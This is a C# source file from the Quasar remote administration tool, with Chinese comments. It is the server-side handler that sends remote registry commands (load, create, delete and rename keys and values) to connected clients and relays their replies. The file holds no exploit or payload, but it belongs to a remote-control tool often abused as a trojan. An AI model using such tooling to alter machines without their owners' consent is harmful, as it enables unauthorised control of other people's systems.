﻿﻿using Microsoft.Win32;
using Quasar.Common.Messages;
using Quasar.Common.Models;
using Quasar.Common.Networking;
using Quasar.Server.Networking;

namespace Quasar.Server.Messages
{
    /// <summary>
    /// 处理与远程注册表交互的消息。
    /// </summary>
    public class RegistryHandler : MessageProcessorBase<string>
    {
        /// <summary>
        /// 与此注册表处理器关联的客户端。
        /// </summary>
        private readonly Client _client;

        public delegate void KeysReceivedEventHandler(object sender, string rootKey, RegSeekerMatch[] matches);
        public delegate void KeyCreatedEventHandler(object sender, string parentPath, RegSeekerMatch match);
        public delegate void KeyDeletedEventHandler(object sender, string parentPath, string subKey);
        public delegate void KeyRenamedEventHandler(object sender, string parentPath, string oldSubKey, string newSubKey);
        public delegate void ValueCreatedEventHandler(object sender, string keyPath, RegValueData value);
        public delegate void ValueDeletedEventHandler(object sender, string keyPath, string valueName);
        public delegate void ValueRenamedEventHandler(object sender, string keyPath, string oldValueName, string newValueName);
        public delegate void ValueChangedEventHandler(object sender, string keyPath, RegValueData value);

        public event KeysReceivedEventHandler KeysReceived;
        public event KeyCreatedEventHandler KeyCreated;
        public event KeyDeletedEventHandler KeyDeleted;
        public event KeyRenamedEventHandler KeyRenamed;
        public event ValueCreatedEventHandler ValueCreated;
        public event ValueDeletedEventHandler ValueDeleted;
        public event ValueRenamedEventHandler ValueRenamed;
        public event ValueChangedEventHandler ValueChanged;

        /// <summary>
        /// 报告最初接收的注册表键。
        /// </summary>
        /// <param name="rootKey">根注册表键名称。</param>
        /// <param name="matches">子注册表键。</param>
        private void OnKeysReceived(string rootKey, RegSeekerMatch[] matches)
        {
            SynchronizationContext.Post(t =>
            {
                var handler = KeysReceived;
                handler?.Invoke(this, rootKey, (RegSeekerMatch[]) t);
            }, matches);
        }

        /// <summary>
        /// 报告创建的注册表键。
        /// </summary>
        /// <param name="parentPath">注册表键父路径。</param>
        /// <param name="match">创建的注册表键。</param>
        private void OnKeyCreated(string parentPath, RegSeekerMatch match)
        {
            SynchronizationContext.Post(t =>
            {
                var handler = KeyCreated;
                handler?.Invoke(this, parentPath, (RegSeekerMatch) t);
            }, match);
        }

        /// <summary>
        /// 报告删除的注册表键。
        /// </summary>
        /// <param name="parentPath">注册表键父路径。</param>
        /// <param name="subKey">注册表子键名称。</param>
        private void OnKeyDeleted(string parentPath, string subKey)
        {
            SynchronizationContext.Post(t =>
            {
                var handler = KeyDeleted;
                handler?.Invoke(this, parentPath, (string) t);
            }, subKey);
        }

        /// <summary>
        /// 报告重命名的注册表键。
        /// </summary>
        /// <param name="parentPath">注册表键父路径。</param>
        /// <param name="oldSubKey">旧注册表子键名称。</param>
        /// <param name="newSubKey">新注册表子键名称。</param>
        private void OnKeyRenamed(string parentPath, string oldSubKey, string newSubKey)
        {
            SynchronizationContext.Post(t =>
            {
                var handler = KeyRenamed;
                handler?.Invoke(this, parentPath, oldSubKey, (string) t);
            }, newSubKey);
        }

        /// <summary>
        /// 报告创建的注册表值。
        /// </summary>
        /// <param name="keyPath">注册表键路径。</param>
        /// <param name="value">创建的值。</param>
        private void OnValueCreated(string keyPath, RegValueData value)
        {
            SynchronizationContext.Post(t =>
            {
                var handler = ValueCreated;
                handler?.Invoke(this, keyPath, (RegValueData)t);
            }, value);
        }

        /// <summary>
        /// 报告删除的注册表值。
        /// </summary>
        /// <param name="keyPath">注册表键路径。</param>
        /// <param name="valueName">值名称。</param>
        private void OnValueDeleted(string keyPath, string valueName)
        {
            SynchronizationContext.Post(t =>
            {
                var handler = ValueDeleted;
                handler?.Invoke(this, keyPath, (string) t);
            }, valueName);
        }

        /// <summary>
        /// 报告重命名的注册表值。
        /// </summary>
        /// <param name="keyPath">注册表键路径。</param>
        /// <param name="oldValueName">旧值名称。</param>
        /// <param name="newValueName">新值名称。</param>
        private void OnValueRenamed(string keyPath, string oldValueName, string newValueName)
        {
            SynchronizationContext.Post(t =>
            {
                var handler = ValueRenamed;
                handler?.Invoke(this, keyPath, oldValueName, (string) t);
            }, newValueName);
        }

        /// <summary>
        /// 报告更改的注册表值。
        /// </summary>
        /// <param name="keyPath">注册表键路径。</param>
        /// <param name="value">新值。</param>
        private void OnValueChanged(string keyPath, RegValueData value)
        {
            SynchronizationContext.Post(t =>
            {
                var handler = ValueChanged;
                handler?.Invoke(this, keyPath, (RegValueData) t);
            }, value);
        }

        /// <summary>
        /// 使用给定客户端初始化 <see cref="RegistryHandler"/> 类的新实例。
        /// </summary>
        /// <param name="client">关联的客户端。</param>
        public RegistryHandler(Client client) : base(true)
        {
            _client = client;
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetRegistryKeysResponse ||
                                                             message is GetCreateRegistryKeyResponse ||
                                                             message is GetDeleteRegistryKeyResponse ||
                                                             message is GetRenameRegistryKeyResponse ||
                                                             message is GetCreateRegistryValueResponse ||
                                                             message is GetDeleteRegistryValueResponse ||
                                                             message is GetRenameRegistryValueResponse ||
                                                             message is GetChangeRegistryValueResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetRegistryKeysResponse keysResp:
                    Execute(sender, keysResp);
                    break;
                case GetCreateRegistryKeyResponse createKeysResp:
                    Execute(sender, createKeysResp);
                    break;
                case GetDeleteRegistryKeyResponse deleteKeysResp:
                    Execute(sender, deleteKeysResp);
                    break;
                case GetRenameRegistryKeyResponse renameKeysResp:
                    Execute(sender, renameKeysResp);
                    break;
                case GetCreateRegistryValueResponse createValueResp:
                    Execute(sender, createValueResp);
                    break;
                case GetDeleteRegistryValueResponse deleteValueResp:
                    Execute(sender, deleteValueResp);
                    break;
                case GetRenameRegistryValueResponse renameValueResp:
                    Execute(sender, renameValueResp);
                    break;
                case GetChangeRegistryValueResponse changeValueResp:
                    Execute(sender, changeValueResp);
                    break;
            }
        }

        /// <summary>
        /// 加载给定根键的注册表键。
        /// </summary>
        /// <param name="rootKeyName">根键名称。</param>
        public void LoadRegistryKey(string rootKeyName)
        {
            _client.Send(new DoLoadRegistryKey
            {
                RootKeyName = rootKeyName
            });
        }

        /// <summary>
        /// 在给定父路径创建注册表键。
        /// </summary>
        /// <param name="parentPath">父路径。</param>
        public void CreateRegistryKey(string parentPath)
        {
            _client.Send(new DoCreateRegistryKey
            {
                ParentPath = parentPath
            });
        }

        /// <summary>
        /// 删除给定的注册表键。
        /// </summary>
        /// <param name="parentPath">要删除的注册表键的父路径。</param>
        /// <param name="keyName">要删除的注册表键名称。</param>
        public void DeleteRegistryKey(string parentPath, string keyName)
        {
            _client.Send(new DoDeleteRegistryKey
            {
                ParentPath = parentPath,
                KeyName = keyName
            });
        }

        /// <summary>
        /// 重命名给定的注册表键。
        /// </summary>
        /// <param name="parentPath">要重命名的注册表键的父路径。</param>
        /// <param name="oldKeyName">注册表键的旧名称。</param>
        /// <param name="newKeyName">注册表键的新名称。</param>
        public void RenameRegistryKey(string parentPath, string oldKeyName, string newKeyName)
        {
            _client.Send(new DoRenameRegistryKey
            {
                ParentPath = parentPath,
                OldKeyName = oldKeyName,
                NewKeyName = newKeyName
            });
        }

        /// <summary>
        /// 创建注册表键值。
        /// </summary>
        /// <param name="keyPath">注册表键路径。</param>
        /// <param name="kind">注册表键值的类型。</param>
        public void CreateRegistryValue(string keyPath, RegistryValueKind kind)
        {
            _client.Send(new DoCreateRegistryValue
            {
                KeyPath = keyPath,
                Kind = kind
            });
        }

        /// <summary>
        /// 删除注册表键值。
        /// </summary>
        /// <param name="keyPath">注册表键路径。</param>
        /// <param name="valueName">要删除的注册表键值名称。</param>
        public void DeleteRegistryValue(string keyPath, string valueName)
        {
            _client.Send(new DoDeleteRegistryValue
            {
                KeyPath = keyPath,
                ValueName = valueName
            });
        }

        /// <summary>
        /// 重命名注册表键值。
        /// </summary>
        /// <param name="keyPath">注册表键路径。</param>
        /// <param name="oldValueName">旧注册表键值名称。</param>
        /// <param name="newValueName">新注册表键值名称。</param>
        public void RenameRegistryValue(string keyPath, string oldValueName, string newValueName)
        {
            _client.Send(new DoRenameRegistryValue
            {
                KeyPath = keyPath,
                OldValueName = oldValueName,
                NewValueName = newValueName
            });
        }

        /// <summary>
        /// 更改注册表键值。
        /// </summary>
        /// <param name="keyPath">注册表键路径。</param>
        /// <param name="value">更新的注册表键值。</param>
        public void ChangeRegistryValue(string keyPath, RegValueData value)
        {
            _client.Send(new DoChangeRegistryValue
            {
                KeyPath = keyPath,
                Value = value
            });
        }

        private void Execute(ISender client, GetRegistryKeysResponse message)
        {
            if (!message.IsError)
            {
                OnKeysReceived(message.RootKey, message.Matches);
            }
            else
            {
                OnReport(message.ErrorMsg);
            }
        }

        private void Execute(ISender client, GetCreateRegistryKeyResponse message)
        {
            if (!message.IsError)
            {
                OnKeyCreated(message.ParentPath, message.Match);
            }
            else
            {
                OnReport(message.ErrorMsg);
            }
        }

        private void Execute(ISender client, GetDeleteRegistryKeyResponse message)
        {
            if (!message.IsError)
            {
                OnKeyDeleted(message.ParentPath, message.KeyName);
            }
            else
            {
                OnReport(message.ErrorMsg);
            }
        }

        private void Execute(ISender client, GetRenameRegistryKeyResponse message)
        {
            if (!message.IsError)
            {
                OnKeyRenamed(message.ParentPath, message.OldKeyName, message.NewKeyName);
            }
            else
            {
                OnReport(message.ErrorMsg);
            }
        }

        private void Execute(ISender client, GetCreateRegistryValueResponse message)
        {
            if (!message.IsError)
            {
                OnValueCreated(message.KeyPath, message.Value);
            }
            else
            {
                OnReport(message.ErrorMsg);
            }
        }

        private void Execute(ISender client, GetDeleteRegistryValueResponse message)
        {
            if (!message.IsError)
            {
                OnValueDeleted(message.KeyPath, message.ValueName);
            }
            else
            {
                OnReport(message.ErrorMsg);
            }
        }

        private void Execute(ISender client, GetRenameRegistryValueResponse message)
        {
            if (!message.IsError)
            {
                OnValueRenamed(message.KeyPath, message.OldValueName, message.NewValueName);
            }
            else
            {
                OnReport(message.ErrorMsg);
            }
        }

        private void Execute(ISender client, GetChangeRegistryValueResponse message)
        {
            if (!message.IsError)
            {
                OnValueChanged(message.KeyPath, message.Value);
            }
            else
            {
                OnReport(message.ErrorMsg);
            }
        }
    }
}
